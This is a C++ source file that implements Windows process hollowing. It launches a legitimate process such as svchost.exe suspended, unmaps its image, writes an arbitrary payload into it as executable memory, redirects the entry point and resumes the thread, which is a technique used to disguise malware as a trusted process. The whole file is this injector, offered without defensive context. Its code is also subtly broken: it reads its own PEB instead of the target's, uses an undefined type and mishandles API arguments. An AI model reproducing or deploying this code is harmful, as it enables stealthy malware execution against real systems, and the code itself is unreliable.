#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include "injector.h"

// Define missing types and functions
typedef NTSTATUS(NTAPI* NtUnmapViewOfSection_t)(HANDLE ProcessHandle, PVOID BaseAddress);
typedef struct _PEB {
    BYTE Reserved1[2];
    BYTE BeingDebugged;
    BYTE Reserved2[1];
    PVOID Ldr;
    PVOID ProcessParameters;
    BYTE Reserved3[520];
    PVOID PostProcessInitRoutine;
    BYTE Reserved4[136];
    PVOID ImageBaseAddress;
} PEB, *PPEB;

// Spawns a suspended process and hollows its memory
bool HollowProcess(const char* targetPath, const char* payloadPath) {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    
    // 1. Create suspended target process (e.g., svchost.exe)
    if (!CreateProcessA(
        targetPath, NULL, NULL, NULL, FALSE,
        CREATE_SUSPENDED | DETACHED_PROCESS, NULL, NULL, &si, &pi)) {
        return false;
    }

    // 2. Get target process's PEB and image base
    PPROCESS_ENVIRONMENT_BLOCK_CUSTOM pPeb = (PPROCESS_ENVIRONMENT_BLOCK_CUSTOM)__readgsqword(0x60); // x64 specific
    LPVOID imageBase = pPeb->ImageBaseAddress;

    // 3. Map payload into memory
    HANDLE hFile = CreateFileA(
        payloadPath, GENERIC_READ, FILE_SHARE_READ, NULL,
        OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return false;

    DWORD payloadSize = GetFileSize(hFile, NULL);
    LPVOID payloadBuffer = VirtualAlloc(
        NULL, payloadSize, MEM_COMMIT, PAGE_READWRITE);
    ReadFile(hFile, payloadBuffer, payloadSize, NULL, NULL);

    // 4. Hollow target process
    NtUnmapViewOfSection_t NtUnmapViewOfSection = 
        (NtUnmapViewOfSection_t)GetProcAddress(
            GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection");
    NtUnmapViewOfSection(pi.hProcess, imageBase);

    // 5. Allocate new memory and write payload
    LPVOID newBase = VirtualAllocEx(
        pi.hProcess, imageBase, payloadSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(
        pi.hProcess, newBase, payloadBuffer, payloadSize, NULL);

    // 6. Set new entry point and resume
    CONTEXT ctx;
    GetThreadContext(pi.hThread, &ctx);
    ctx.Rcx = (DWORD64)newBase + 0x1000; // Adjust for your payload's EP
    SetThreadContext(pi.hThread, &ctx);
    ResumeThread(pi.hThread);

    CloseHandle(hFile);
    return true;
}